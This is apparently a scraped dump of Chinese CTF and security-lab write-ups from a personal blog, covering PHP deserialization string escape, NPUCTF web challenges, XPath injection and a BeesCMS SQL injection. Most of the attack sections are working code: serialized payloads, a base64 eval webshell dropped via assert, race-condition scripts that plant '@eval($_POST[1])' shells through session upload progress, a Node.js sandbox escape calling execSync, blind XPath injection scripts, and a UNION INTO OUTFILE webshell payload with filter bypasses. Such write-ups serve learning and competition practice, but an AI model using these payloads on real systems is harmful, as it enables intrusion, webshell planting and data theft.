有上面一段代码，可以看到我们可控的地方只有$username，后面有一个filter函数替换 我们知道，PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的 正常的序列化结果是这样的(假设u=admin): 1a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:3:&quot;aaa&quot;;&#125; 此时是没有x的，假设我们输入一个带字母x的(u=testx)，序列化经过替换就会变成 1a:2:&#123;i:0;s:5:&quot;testyy&quot;;i:1;s:3:&quot;aaa&quot;;&#125; 此时反序列化，就会失败，testyy的长度不是5而是6，unserialize函数返回false 但是，假如我们传入，长度为38 1/?u=xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;&#125; 此时序列化结果是： 1a:2:&#123;i:0;s:38:&quot;xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;&#125;&quot;;i:1;s:3:&quot;aaa&quot;;&#125; 经过替换后序列化结果： 1a:2:&#123;i:0;s:38:&quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:5:&quot;admin&quot;;&#125;&quot;;i:1;s:3:&quot;aaa&quot;;&#125; 此时yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy的长度刚好为38，再加上后面的;i:1;s:5:&quot;admin&quot;;&#125;成功反序列化，而这后面的直接忽略了 那怎样算到底有多少个x呢？我用的方法是列方程😂 首先我们要确定需要添加的内容，也就是后面一串，即&quot;;i:1;s:5:&quot;admin&quot;;&#125;，长度为19(设为m)，满足以下式子(设有n个x字符，&quot;;i:1;s:5:&quot;admin&quot;;&#125;前面有y个非x字符)： 1n+y+m=2n+y // 原来字符串的长度 = 替换后去掉m的长度 解方程得n=19，即我们要有19个x，y随意，从等式可以看出抵消了 如果碰到除不尽的情况，我们可以在&quot;;i:1;s:5:&quot;admin&quot;;&#125;前面增加一些非x字符，类似 1a&quot;;i:1;s:5:&quot;admin&quot;;&#125; 此时m的长度大于19 CTF题目2020安恒四月月赛源码如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpshow_source(&quot;index.php&quot;);function write($data) &#123; return str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\\0\\0\\0&#x27;, $data);&#125;function read($data) &#123; return str_replace(&#x27;\\0\\0\\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $data);&#125;class A&#123; public $username; public $password; function __construct($a, $b)&#123; $this-&gt;username = $a; $this-&gt;password = $b; &#125;&#125;class B&#123; public $b = &#x27;gqy&#x27;; function __destruct()&#123; $c = &#x27;a&#x27;.$this-&gt;b; echo $c; &#125;&#125;class C&#123; public $c; function __toString()&#123; //flag.php echo file_get_contents($this-&gt;c); return &#x27;nice&#x27;; &#125;&#125;$a = new A($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);//省略了存储序列化数据的过程,下面是取出来并反序列化的操作$e = serialize($a);$c = write($e);$d = read($c);$b = unserialize($d); 可以看到，我们可以控制GET参数a,b的值 在反序列化之前，序列化字符串经过了两次替换（chr(0)用%00替换） 第一次是把%00*%00替换成了\\0\\0\\0，这里长度增加，由3变成6 第二次是把\\0\\0\\0替换成了%00*%00，这里长度减少，由6变成3 先看下正常序列化的结果(a=admin,b=admin): 1O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125; 首先我们知道，如果是嵌套的类（类里面的参数还是个类），举个例子，这里为了方便直接把读flag.php的链构造出来了： 1234567891011121314151617181920212223242526272829&lt;?phpclass A&#123; public $username; public $password; function __construct($a, $b)&#123; $this-&gt;username = $a; $this-&gt;password = $b; &#125;&#125;class B&#123; public $b = &#x27;gqy&#x27;; // function __destruct()&#123; // $c = &#x27;a&#x27;.$this-&gt;b; // echo $c; // &#125;&#125;class C&#123; public $c; // function __toString()&#123; // echo file_get_contents($this-&gt;c); // return &#x27;nice&#x27;; // &#125;&#125;$c=new C;$c-&gt;c=&#x27;flag.php&#x27;;$b=new B;$b-&gt;b=$c;$a=new A($b,&#x27;admin&#x27;);echo serialize($a); 此时的序列化结果是这样的： 1O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125; 由于我们传的A类username属性是一个B对象，所以后面就变成了 1O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 而这个B对象的b属性是一个C对象，所以还能分解 1O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125; 明白类里面嵌套类的序列化格式，我们再来看怎末逃逸出去的。 首先我们要知道的下面一串是我们需要添上去的，长度为58 1&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; 我们可以把序列化字符串放到username那里，并且用之前那个例子变长的那种思路，但是这种方式并不行，因为经过替换之后它又替换回来了,所以我们只能用变短的思路 总的思路:通俗的说就是username吃掉后面的password 正常序列化字符串 1O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125; 此时我们需要添加的就变成，长度为72 1;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; 要吃掉的就是,长度23，**那里表示两位，表示password的长度 1&quot;;s:8:&quot;password&quot;;s:**:&quot; 列方程,n代表\\0\\0\\0的数目，y表示其它字符 126n+y=3n+23+y // 原字符长度 = 吃掉&quot;;s:8:&quot;password&quot;;s:**:&quot; + 替换后长度 // 其它字符在替换时不受影响 可以不考虑 计算一下发现3n=23,除不尽，所以我们需要改下后面那串，前面增加点东西，类似 1a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; 想获取多种payloaad，我们可以列式子，k表示增加的字符长度 16n+y=3n+23+y+k 当k=1时 n=8 可以构造payload: 1?a=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b=a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; 也可以当k=4 n=9 payload: 1?a&#x3D;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b&#x3D;abcd&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; 参考： https://xz.aliyun.com/t/6718","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"反序列化","slug":"反序列化","permalink":"http://www.moonback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"NPUCTF writeup","slug":"NPUCTF-writeup","date":"2020-04-18T04:07:17.000Z","updated":"2020-09-29T12:16:08.931Z","comments":true,"path":"2020/04/18/NPUCTF-writeup/","link":"","permalink":"http://www.moonback.xyz/2020/04/18/NPUCTF-writeup/","excerpt":"记一下writeup! wtcl!","text":"记一下writeup! wtcl! web查源码查源码得到flag RealEzPHP在 1/time.php?source 看到源码 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); exp: 12345678910&lt;?phpclass HelloPhp&#123; public $a; public $b;&#125; $c=new HelloPhp;$c-&gt;a = &#x27;file_put_contents(&quot;1.php&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));&#x27;;$c-&gt;b = &#x27;assert&#x27;;echo serialize($c); 蚁剑连上以后bypass disable_fuction在环境变量里找到flag ezphp查看源码发现index.bak.php 伪协议读源码 1index.bak.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;msg.php 123456789101112131415161718192021222324&lt;?php header(&#x27;content-type:application/json&#x27;);session_start();function safe($msg)&#123; if (strlen($msg)&gt;17)&#123; return &quot;msg is too loooong!&quot;; &#125; else &#123; return preg_replace(&quot;/php/&quot;,&quot;?&quot;,$msg); &#125;&#125;if (!isset($_SESSION[&#x27;msg&#x27;])&amp;empty($_SESSION[&#x27;msg&#x27;]))$_SESSION[&#x27;msg&#x27;] = array();if (isset($_POST[&#x27;msg&#x27;]))&#123; array_push($_SESSION[&#x27;msg&#x27;], [&#x27;msg&#x27;=&gt;safe($_POST[&#x27;msg&#x27;]),&#x27;time&#x27;=&gt;date(&#x27;Y-m-d H:i:s&#x27;,time())]); echo json_encode(array([&#x27;msg&#x27;=&gt;safe($_POST[&#x27;msg&#x27;]),&#x27;time&#x27;=&gt;date(&#x27;Y-m-d H:i:s&#x27;,time())])); exit();&#125;if(!empty($_SESSION[&#x27;msg&#x27;]))&#123; echo json_encode($_SESSION[&#x27;msg&#x27;]);&#125; else &#123;echo &quot;还不快去留言！&quot;;&#125;?&gt; 再读下index.bak.php 12345678&lt;?php session_start();if(isset($_GET[&#x27;action&#x27;]))&#123; include $_GET[&#x27;action&#x27;]; exit();&#125; else &#123; header(&quot;location:./index.bak.php?action=message.php&quot;);&#125; 很明显，能包含，能控制session内容，但是无法写入php内容进里面 有个phpinfo.php，我们可以用包含临时文件那种 直接用Vulhub上的exp: https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py 或者用session上传进度那种方式 123456789101112131415161718192021222324252627import requestsimport threadingurl=&#x27;http://47.97.210.141:9555/index.php&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=dddd&#x27;&#125;def POST(): while True: files=&#123; &quot;upload&quot;:&#x27;&#x27; #上传无效的空文件 &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&#x27;&#x27;&lt;?php echo &quot;flag&quot;;file_put_contents(&#x27;/var/www/html/a.php&#x27;,&#x27;&lt;?php @eval($_POST[1]);&#x27;);?&gt;&#x27;&#x27;&#x27; #恶意进度信息，readfile将直接输出文件内容 &#125; r.post(url,files=files,headers=headers,data=data) # print(&#x27;[+]POST&#x27;)def READ(): while True: t=r.get(&quot;http://47.97.210.141:9555/index.bak.php?action=/tmp/sess_dddd&quot;) if &#x27;flag&#x27; in t.text: print(&quot;success&quot;)for i in range(30): threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() 然后蚁剑连，bypass disable_function就行了 ezinclude抓包看到 很明显hash长度扩展攻击 这题出的好像有点问题，直接把hash给了出来，如下图把Hash的值复制到pass就可以绕过 按照正常的思路我们是需要爆破长度的，首先我们需要知道$secret+某个值的hash值，尝试的还是上面的操作 然后就可以写exp了： 12345678910111213141516171819import hashpumpyimport urllibimport requestsurl=&#x27;http://ac35c878-20c8-4151-a64f-f832b83fee89.node3.buuoj.cn/?&#x27;hsh=&#x27;576322dd496b99d07b5b0f7fa7934a25&#x27;s1=&#x27;&#x27;&#x27;1&#x27;&#x27;&#x27;s2=&#x27;&#x27;&#x27;admin&#x27;&#x27;&#x27;for i in range(50): m=hashpumpy.hashpump(hsh,s1,s2,i) print i name=urllib.quote(urllib.unquote(m[1])) uri=url+&#x27;name=&#x27;+name+&quot;&amp;pass=&quot;+m[0] print uri r=requests.get(uri) print r.text if &quot;error&quot; not in r.text: print r.text; break hashpumpy.hashpump()四个参数的意思： 1234$hash1 = md5($secret.$salt1);$hash2 = md5($secret.$salt2);==&gt; hashpumpy.hashpump($hash1,$salt1,$salt2,i) // i代表$secret的长度 最终跑出来secret长度为32，重定向到flflflflag.php 访问会重定向到404.html,抓包发现 包含，伪协议读源吗 123456789// php://filter/read=convert.base64-encode/resource=flflflflag.php&lt;?php$file=$_GET[&#x27;file&#x27;];if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123; die(&#x27;nonono&#x27;);&#125;@include($file);echo &#x27;include($_GET[&quot;file&quot;])&#x27;;?&gt; 包含flag无果，试着写临时文件 参考：https://www.anquanke.com/post/id/201136 利用7.0.0 &lt;= PHP Version &lt; 7.0.28的漏洞我们可以写出exp: 123456789101112131415161718192021222324252627282930import requestsimport stringimport itertoolsimport timecharset = string.digits + string.ascii_lettersbase_url = &quot;http://ac35c878-20c8-4151-a64f-f832b83fee89.node3.buuoj.cn&quot;def upload_file_to_include(url, file_content): files = &#123;&#x27;file&#x27;: (&#x27;evil.jpg&#x27;, file_content, &#x27;image/jpeg&#x27;)&#125; try: response = requests.post(url, files=files) except Exception as e: passdef generate_tmp_files(): file_content = &quot;&lt;?php if(file_put_contents(&#x27;/tmp/moonback&#x27;, &#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;))&#123;echo &#x27;flag&#x27;;&#125;?&gt;&quot; self_url = &quot;%s/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot; % (base_url) length = 6 times = len(charset) ** (length / 2) for i in range(int(times)): print(&quot;[+] %d / %d&quot; % (i, times)) time.sleep(0.5) upload_file_to_include(self_url, file_content)generate_tmp_files() 扫目录发现有dir.php，刚好把临时文件名字列出来了，其实不列也可以，只要把所有可能性跑完就可以了 然后包含会生成/tmp/moonback,再包含拿shell就行，最后bypass disable_function,flag在环境变量里 用PHP_SESSION_UPLOAD_PROGRESS也能上传，buu环境不行，exp: 123456789101112131415161718192021222324252627282930import requestsimport threadingurl=&#x27;http://47.97.210.141:9666/flflflflag.php&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=dddd&#x27;&#125;def POST(): while True: files=&#123; &quot;upload&quot;:&#x27;&#x27; #上传无效的空文件 &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php file_put_contents(&quot;/tmp/2&quot;,\\&#x27;&lt;?php @eval($_POST[1]);?&gt;\\&#x27;);echo &quot;moonback&quot;;?&gt;&#x27; &#125; r.post(url,files=files,headers=headers,data=data) # print(&#x27;[+]POST&#x27;)def READ(): while True: t=r.get(url+&quot;?file=/tmp/sess_dddd&quot;) if &#x27;moonback&#x27; in t.text: # print(&#x27;[+]retry&#x27;) print(&#x27;success&#x27;) else: passfor i in range(50): threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() 验证🐎nodejs题目，源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const cookieSession = require(&#x27;cookie-session&#x27;);const fs = require(&#x27;fs&#x27;);const crypto = require(&#x27;crypto&#x27;);const keys = require(&#x27;./key.js&#x27;).keys;function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;function saferEval(str) &#123; if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123; return null; &#125; return eval(str);&#125; // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync(&#x27;./index.html&#x27;).toString();function render(results) &#123; return template.replace(&#x27;&#123;&#123;results&#125;&#125;&#x27;, results.join(&#x27;&lt;br/&gt;&#x27;));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123; name: &#x27;PHPSESSION&#x27;, // 2020.3/WORKER2 嘿嘿，给👴爪⑧ keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#x27;/&#x27;, function (req, res) &#123; let result = &#x27;&#x27;; const results = req.session.results || []; const &#123; e, first, second &#125; = req.body; if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123; if (req.body.e) &#123; try &#123; result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; catch (e) &#123; console.log(e); result = &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`); &#125; &#125; else &#123; results.unshift(&#x27;Not verified!&#x27;); &#125; if (results.length &gt; 13) &#123; results.pop(); &#125; req.session.results = results; res.send(render(req.session.results));&#125;);// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#x27;/source&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;); res.send(fs.readFileSync(&#x27;./index.js&#x27;));&#125;);app.get(&#x27;/&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;); req.session.admin = req.session.admin || 0; res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123; console.log(&#x27;Start listening&#x27;)&#125;); 先看第一层 1if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) keys不知道，要求first和second相等并且长度不等，还要加盐后的MD5值相等 key[0]是字符串，与字符串相加会强制类型转换，String和Array类型都有length属性，而且 所以我们可以一个传数组，另外一个传字符串，但是直接urlencoded是无法传数组的，又发现 1app.use(bodyParser.json()); 所以我们可以传json数据，注意这里是用双引号（官方标准），尽管有时候单引号也可以 1&#123;&quot;e&quot;:&quot;1&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]&#125; 可以看到已经成功绕过，接着看下一步 123if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123; return null;&#125; 后面就是js原型链的内容了，看不懂了，贴下exp: 123456789101112131415import reencode = lambda code: list(map(ord,code))decode = lambda code: &quot;&quot;.join(map(chr,code))a=f&quot;&quot;&quot;(m0=&gt;( m0=m0.constructor, m0.x=m0.constructor( m0.fromCharCode(&#123;encode(&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;)&#125;) )() ))(Math+1)&quot;&quot;&quot;a=re.sub(r&quot;[\\s\\[\\]]&quot;, &quot;&quot;, a).replace(&quot;m0&quot;,&quot;Math&quot;)print(a) ezlogin查看源码发现 每次用不同session请求都会不同，抓包发现有防止csrf的token,请求不能重放 但是我们可以请求带上session获取到token,然后再POST 后面就是xpath注入的内容了，举个例子： 参考：https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97 1234567891011121314&lt;?php$xml = simplexml_load_file(&#x27;users.xml&#x27;);$name = $_GET[&#x27;u&#x27;];$pwd = md5($_GET[&#x27;p&#x27;]);$query = &quot;/root/users/user[username/text()=&#x27;&quot;.$name.&quot;&#x27; and password/text()=&#x27;&quot;.$pwd.&quot;&#x27;]&quot;;echo $query;$result = $xml-&gt;xpath($query);if($result) &#123; echo &#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;; foreach ($result as $key =&gt; $value) &#123; echo &#x27;&lt;br /&gt;ID:&#x27;.$value-&gt;id; echo &#x27;&lt;br /&gt;Username:&#x27;.$value-&gt;username; &#125;&#125; 服务端上的users.xml是这样的 1234567891011121314151617181920212223&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt; &lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password type=&quot;md5&quot;&gt;0192023a7bbd73250516f069df18b500&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;2&lt;/id&gt; &lt;username&gt;jack&lt;/username&gt; &lt;password type=&quot;md5&quot;&gt;1d6c1e168e362bc0092f247399003a88&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;3&lt;/id&gt; &lt;username&gt;tony&lt;/username&gt; &lt;password type=&quot;md5&quot;&gt;cc20f43c8c24dbc0b2539489b113277a&lt;/password&gt; &lt;/user&gt; &lt;/users&gt; &lt;secret&gt; &lt;flag&gt;flag&#123;My_f1rst_xp4th_iNjecti0n&#125;&lt;/flag&gt; &lt;/secret&gt;&lt;/root&gt; xpath学习参考：https://www.runoob.com/xpath/xpath-tutorial.html xpath注入常见函数 codepoints-to-string(a, b, c, …)：将数字 a、b、c 转为对应的字符， Python 的chr函数类似。 string-to-codepoints(string)：与上面的相反 compare(a, b, rule)：比大小，func 是比较大小的规则 string-join((string, string, …), sep)：使用 sep 参数作为分隔符，来返回 string 参数拼接后的字符串。 substring(string, start [,len])：返回从 start 位置开始的指定长度的子字符串。第一个字符的下标是 1。如果省略 len 参数，则返回从位置 start 到字符串末尾的子字符串。 string-length([string])：返回指定字符串的长度。如果没有 string 参数，则返回当前节点的字符串值的长度。 count(item[, item1, …])：返回节点的数量。 position()：返回当前正在被处理的节点的 index 位置。 last()：返回在被处理的节点列表中的项目数目。 name([nodeset])：返回当前节点的名称或指定节点集中的第一个节点 常见的注入分为两种，常规注入和布尔盲注，以上面的为例，先说下常规注入 万能密码上面那个我们就可以构造： 12345$query = &quot;/root/users/user[username/text()=&#x27;&quot;.$name.&quot;&#x27; and password/text()=&#x27;&quot;.$pwd.&quot;&#x27;]&quot;;// 需要知道一个用户名，构造?u=admin&#x27; or &#x27;1&amp;p=// 此时执行的查询$query = &quot;/root/users/user[username/text()=&#x27;admin&#x27; or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;; 假设我们不知道用户名，可以这样构造 123?u=&#x27; or 1 or &#x27;1&amp;p=// 此时执行的查询$query = &quot;/root/users/user[username/text()=&#x27;&#x27; or 1 or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;; 节点遍历构造类似下面，注意Xpath注入不像sql注入一样有注释 1234u=admin&#x27;] | //* | //*[&#x27;&amp;p=// 此时执行的查询$query = &quot;/root/users/user[username/text()=&#x27;&#x27;] | //* | //*[&#x27;&#x27; and password/text()=&#x27;&#x27;]&quot;;// &#x27;]闭合前边的 中间用|连接 //*代表选取文档中的所有元素 这里的|不能用or代替 布尔盲注上面的方法无法爆出来flag，因为php之选择了id和password两个节点 我们可以用布尔盲注的方法爆出来flag 判断节点数量： 123?u=&#x27; or count(/)=1 or &#x27;1&amp;p=// 此时执行的查询,正常返回说明节点数量正确$query = &quot;/root/users/user[username/text()=&#x27;&#x27; or count(/)=1 or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;; 可以依次遍历第二层。。。 1?u=&#x27; or count(/*/*)=1 or &#x27;1&amp;p= 获取节点名称： 1234// 判断节点长度?u=&#x27; or string-length(name(/*[1]))=1 or &#x27;1&amp;p=// 截取节点名称比较字符?u=&#x27; or substring(name(/*[1]), 1, 1)=&#x27;a&#x27; or &#x27;1&amp;p= 按照这种思路我们可以把所有节点跑出来 对于这道题，我们也可以用这种思路，先试下万能密码 提示非法操作说明成功带入了，exp: 12345678910111213141516171819202122232425262728293031323334353637import requestsimport reimport randomurl=&#x27;http://9c306d79-3e0b-4b84-8711-dcfe1d3dc1b4.node3.buuoj.cn/login.php&#x27;s=&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#123;-*#$@()+^?/&lt;&gt;|~&#125;&#x27;data=&quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;proxies=&#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;# def get_token():# ran=random.randint(1,100000000000000)# headers=&#123;# &quot;Cookie&quot;:&quot;PHPSESSID=&#123;&#125;&quot;.format(str(ran))# &#125;# r1=requests.get(url,headers=headers,proxies=proxies)# token=re.search(r&#x27;\\&lt;input type=\\&quot;hidden\\&quot; id=\\&quot;token\\&quot; value=\\&quot;(.*)\\&quot; \\/\\&gt;&#x27;,r1.text).group(1)# return ran,tokenflag=&#x27;&#x27;for i in range(1,50): flag1=flag for j in s: sess=requests.session() # ran,token=get_token() r1=sess.get(url,proxies=proxies) token=re.search(r&#x27;\\&lt;input type=\\&quot;hidden\\&quot; id=\\&quot;token\\&quot; value=\\&quot;(.*)\\&quot; \\/\\&gt;&#x27;,r1.text).group(1) headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/xml&#x27; &#125; r2=sess.post(url,data=data.format(str(i),j,token),headers=headers,proxies=proxies) if &#x27;非法操作&#x27; in r2.text: flag+=j print(j) if flag1==flag: breakprint(flag) 跑出如下格式的节点 1234567891011121314&lt;root&gt; &lt;accounts&gt; &lt;user&gt; &lt;id&gt;&lt;/id&gt; &lt;username&gt;&lt;/username&gt; &lt;password&gt;&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;&lt;/id&gt; &lt;username&gt;&lt;/username&gt; &lt;password&gt;&lt;/password&gt; &lt;/user&gt; &lt;/accounts&gt;&lt;/root&gt; 然后我们用 1&lt;username&gt;&#x27; or substring(/root/accounts/user/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt; 跑出第一个，发现登陆上去啥都没有 12username=guestpassword=e10adc3949ba59abbe56e057f20f883e MD5解密123456 再跑第二个 12username=adm1npassword=cf7414b5bdb2e65ee43083f4ddbc4d9f MD5解密gtfly123 接着就是php://filter读文件,过滤了php,read,base,大写绕过 1admin.php?file=PHP://filter/rEad=convert.basE64-encode/resource=/flag 学长出的题太顶了，膜拜！！！ misccrypto这是什么密码题目： 搜了搜，搜到了个日历密码 F代表周五 S1代表周六 S2代表周日 后面是第几个周* 对应字母表就行 1234F1 W1 S22 S21 T12 S11 W1 S133 1 12 5 14 4 1 18calendarflag&#123;calendar&#125; Classical_Cipher123压缩包密码：gsv_pvb_rh_zgyzhs对应明文： ***_key_**_****** 写了个exp: 123456789for i,j in zip(&quot;pvb&quot;,&quot;key&quot;): print(ord(i)+ord(j))key=&#x27;&#x27;for i in &quot;gsv_pvb_rh_zgyzhs&quot;: if i!=&quot;_&quot;: key=key+chr(219-ord(i)) else: key=key+&quot;_&quot;print(key) 其实这个是埃特巴什密码 解压之后，一张图，做多了就知道是猪圈变种密码和埃及象形文字，贴一下图： 埃及象形文字： 猪圈密码： 所以解出来就是： 1flag&#123;classicalcode&#125; Mersenne_twister","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"NPUCTF","slug":"NPUCTF","permalink":"http://www.moonback.xyz/tags/NPUCTF/"}]},{"title":"墨者学院题目writeup","slug":"墨者学院题目writeup","date":"2020-04-13T13:09:01.000Z","updated":"2020-04-26T10:23:41.946Z","comments":true,"path":"2020/04/13/墨者学院题目writeup/","link":"","permalink":"http://www.moonback.xyz/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/","excerpt":"最近360众测很火，听说好多这上面的题，抽空做做！","text":"最近360众测很火，听说好多这上面的题，抽空做做！ Web安全CMS漏洞BeesCMS系统漏洞分析溯源御剑扫目录： 发现后台/admin/login.php，此处存在sql注入 详细分析参见：https://www.cnblogs.com/yuzly/p/11423384.html 此处验证码存在漏洞，即一个验证码可多次使用，我们在username处加上一个&#39;发现 sql语句也出来了 1select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name=&#x27;dsad&#x27;&#x27; limit 0,1 漏洞分析可知，union, and,select被替换，可以这样绕过： 123union =&gt; uni union onselect =&gt; selselectectand =&gt; a and nd user输入,发现成功报错注入 1admin &#x27; a and nd extractvalue(1,concat(1,database()))%23 试着写shell，这里有htmlspecialchars函数的过滤，16进制或者char函数绕过，url编码好像绕过不了，还有对into ,outfile的过滤，可以这样绕过 12outfile =&gt; outoutfilefileinto =&gt; in into 最终构造payload: 1admin&#x27; uni union on selselectect 1,2,3,4,0x3c3f70687020406576616c28245f504f53545b315d293b3f3e in into outoutfilefile %27/var/www/html/moonback.php%27%23 或者 1admin&#x27; uni union on selselectect null,null,null,null,CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 